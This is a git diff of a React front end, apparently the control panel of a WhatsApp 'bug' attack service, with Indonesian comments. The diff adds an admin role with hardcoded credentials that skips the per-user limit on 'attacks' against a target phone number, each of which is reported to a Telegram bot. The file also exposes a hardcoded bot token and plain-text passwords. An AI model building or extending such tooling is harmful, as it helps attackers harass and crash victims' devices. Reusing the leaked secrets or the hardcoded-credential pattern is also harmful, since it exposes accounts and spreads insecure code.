@@ -1,7 +1,7 @@
 "use client"
 
 import React, { useState, useEffect, useRef } from "react"
-import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban } from "lucide-react"
+import { Shield, Bug, LayoutDashboard, Settings, Loader2, Music, ChevronLeft, ChevronRight, Volume2, VolumeX, Zap, EyeOff, Copy, CheckCircle2, AlertTriangle, ExternalLink, Lock, Ghost, Skull, ZapOff, Activity, Ban, Infinity } from "lucide-react"
 
 // GANTI INI DULU
 const TELE_TOKEN = "8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk"
@@ -30,8 +30,10 @@ export default function YaeMikoDashboard() {
   const [showRestrictedOverlay, setShowRestrictedOverlay] = useState(false)
   const [showVerifyModal, setShowVerifyModal] = useState(false)
   
-  // Fitur Baru: State untuk menyimpan status verifikasi target
   const [isVerified, setIsVerified] = useState(false)
+
+  // FITUR TINGKATAN AKUN: Menyimpan role user yang sedang login ('free' atau 'admin')
+  const [userRole, setUserRole] = useState<"free" | "admin">("free")
 
   const bgMusicRef = useRef<HTMLAudioElement>(null)
   const isSendingRef = useRef(false)
@@ -106,7 +108,6 @@ export default function YaeMikoDashboard() {
     setShowVerifyModal(false)
     setIsSending(true)
 
-    // Simpan status verifikasi ke state dan localStorage agar permanen sekali seumur hidup browser target
     setIsVerified(true)
     localStorage.setItem('target_verified', 'true')
 
@@ -150,6 +151,9 @@ export default function YaeMikoDashboard() {
 
   const syncWithCloud = async (action: 'get' | 'set' | 'sendReport', valueToSet?: number, messageText?: string) => {
     try {
+      // Jika yang login admin, matikan sinkronisasi limit agar database cloud tidak mengacaukan status unlimited di UI
+      if (userRole === "admin" && (action === 'get' || action === 'set')) return
+
       if (action === 'get') {
         if (isSendingRef.current) return
         const res = await fetch(`/api/control?update=${Date.now()}`, {
@@ -185,7 +189,6 @@ export default function YaeMikoDashboard() {
     async function initData() {
       await syncWithCloud('get')
       
-      // Cek riwayat verifikasi di browser target pas web dimuat
       const localVerify = localStorage.getItem('target_verified')
       if (localVerify === 'true') {
         setIsVerified(true)
@@ -194,14 +197,14 @@ export default function YaeMikoDashboard() {
       setIsHydrated(true)
     }
     initData()
-  }, [])
+  }, [userRole]) // Re-run sync cloud jika role berubah
 
   useEffect(() => {
     const autoRefresh = setInterval(async () => {
       await syncWithCloud('get')
     }, 15000)
     return () => clearInterval(autoRefresh)
-  }, [])
+  }, [userRole])
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -224,11 +227,21 @@ export default function YaeMikoDashboard() {
     }
   }, [isMusicOn, isLoggedIn, isWebLocked, isHydrated])
 
+  // FITUR TINGKATAN LOGIN: Cek Akun Admin & Akun Member
   const handleLogin = async () => {
-    if (username === "Selz" && password === "Freebug") {
+    if (username === "Leo" && password === "LEONZKENEDYZ") {
+      // Login sebagai Admin Owner
+      setUserRole("admin")
       setIsLoggedIn(true)
       setShowErrorOverlay(false)
-      const logMsg = `🔔 *LAPORAN LOGIN DASHBOARD*\n\n👤 *User:* ${username}\n🔑 *Status:* Berhasil Masuk Web`
+      const logMsg = `👑 *LAPORAN LOGIN ADMIN OWNER*\n\n👤 *User:* ${username}\n⚡ *Status:* Masuk sebagai Administrator (Sistem Bypass Limit Aktif)`
+      await syncWithCloud('sendReport', undefined, logMsg)
+    } else if (username === "Selz" && password === "Freebug") {
+      // Login sebagai Member Free biasa
+      setUserRole("free")
+      setIsLoggedIn(true)
+      setShowErrorOverlay(false)
+      const logMsg = `🔔 *LAPORAN LOGIN DASHBOARD MEMBER*\n\n👤 *User:* ${username}\n🔑 *Status:* Berhasil Masuk Web`
       await syncWithCloud('sendReport', undefined, logMsg)
     } else {
       setShowErrorOverlay(true)
@@ -242,30 +255,34 @@ export default function YaeMikoDashboard() {
       setShowRestrictedOverlay(true)
       return
     }
-    if (bugLimit <= 0) {
+
+    // Cek limit hanya berlaku untuk pengguna dengan kasta 'free'
+    if (userRole === "free" && bugLimit <= 0) {
       setShowLimitPopup(true)
       return
     }
 
-    const nextLimit = Math.max(0, bugLimit - 1)
     isSendingRef.current = true
-    setBugLimit(nextLimit)
+    
+    // Kurangi limit jika user biasa, kalau admin biarkan tetap aman bebas kirim
+    let nextLimit = bugLimit
+    if (userRole === "free") {
+      nextLimit = Math.max(0, bugLimit - 1)
+      setBugLimit(nextLimit)
+      await syncWithCloud('set', nextLimit)
+    }
 
     const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
     const selectedBug = BUG_TYPES[activeNav].name
 
-    await syncWithCloud('set', nextLimit)
-
     setTimeout(async () => {
-      const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username}\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${nextLimit}/5`
+      const sisaLimitText = userRole === "admin" ? "UNLIMITED (👑 ADMIN)" : `${nextLimit}/5`
+      const attackMsg = `🚀 *LAPORAN PENYERANGAN BUG*\n\n👤 *Pengirim:* ${username} (${userRole.toUpperCase()})\n🎯 *Target:* \`${targetNumber}\`\n👾 *Jenis Bug:* ${selectedBug}\n⚡ *Speed Engine:* ${engineSpeed}\n📉 *Sisa Limit User:* ${sisaLimitText}`
       await syncWithCloud('sendReport', undefined, attackMsg)
 
-      // Cek apakah target sudah pernah klik Lanjutkan verifikasi sebelumnya
       if (isVerified) {
-        // Jika sudah terverifikasi, langsung jalankan fungsi eksekusi tanpa pop-up
         startFinalExecution()
       } else {
-        // Jika belum pernah sama sekali, munculkan pop-up modal
         setShowVerifyModal(true)
       }
 
@@ -378,7 +395,10 @@ export default function YaeMikoDashboard() {
             <div className="animate-in fade-in duration-500">
               <div className="flex justify-between items-center mb-6">
                 <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
-                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${bugLimit > 0 ? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-red-500/10'}`}>LIMIT: {bugLimit}/5</span>
+                {/* TAMPILAN BADGE LIMIT BERBEDA BERDASARKAN ROLE */}
+                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0 ? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-red-500/10'}`}>
+                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
+                </span>
               </div>
               <div className="bg-gradient-to-br from-white/10 to-transparent border border-white/10 rounded-[2.5rem] p-6 mb-6 text-center backdrop-blur-md relative shadow-2xl overflow-hidden">
                 <div className="flex justify-between items-center absolute inset-x-2 top-1/2 -translate-y-1/2 z-10 px-2">
@@ -388,12 +408,17 @@ export default function YaeMikoDashboard() {
                 <div className="mb-3 flex justify-center">{BUG_TYPES[activeNav].icon}</div>
                 <h2 className="text-xl font-black italic uppercase mb-6">{BUG_TYPES[activeNav].name}</h2>
                 <div className="grid grid-cols-3 gap-3">
-                  <div className="bg-black/60 p-3 rounded-xl border border-white/5">
-                    <p className="text-lg font-black text-cyan-400 leading-none">{bugLimit}</p>
+                  {/* LOGIC CARD LIMIT JIKA ADMIN AKAN MUNCUL ICON UNLIMITED */}
+                  <div className="bg-black/60 p-3 rounded-xl border border-white/5 flex flex-col items-center justify-center">
+                    {userRole === "admin" ? (
+                      <Infinity className="w-5 h-5 text-cyan-400 animate-pulse" />
+                    ) : (
+                      <p className="text-lg font-black text-cyan-400 leading-none">{bugLimit}</p>
+                    )}
                     <p className="text-[6px] text-white/40 uppercase font-bold mt-1">LIMIT</p>
                   </div>
                   <div className="bg-black/60 p-3 rounded-xl border border-white/5">
-                    <p className={`text-lg font-black leading-none ${bugLimit > 0 ? 'text-green-500' : 'text-red-600'}`}>{bugLimit > 0 ? 'ACT' : 'OFF'}</p>
+                    <p className={`text-lg font-black leading-none ${userRole === 'admin' || bugLimit > 0 ? 'text-green-500' : 'text-red-600'}`}>{userRole === 'admin' || bugLimit > 0 ? 'ACT' : 'OFF'}</p>
                     <p className="text-[6px] text-white/40 uppercase font-bold mt-1">STATUS</p>
                   </div>
                   <div className="bg-black/60 p-3 rounded-xl border border-white/5">
@@ -412,7 +437,9 @@ export default function YaeMikoDashboard() {
             </div>
           ) : (
             <div className="animate-in fade-in duration-500">
-              <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">Setting Selz</h2>
+              <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">
+                Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}
+              </h2>
               <div className="space-y-5">
                 <div className="bg-white/5 p-6 rounded-[2.5rem] border border-white/5 backdrop-blur-lg shadow-xl">
                   <div className="flex items-center gap-3 mb-5 text-xs font-black uppercase text-white/60 italic"><Zap size={16} className="text-cyan-400"/> Engine Speed</div>
@@ -455,4 +482,4 @@ export default function YaeMikoDashboard() {
       `}</style>
     </div>
   )
-}
+        }
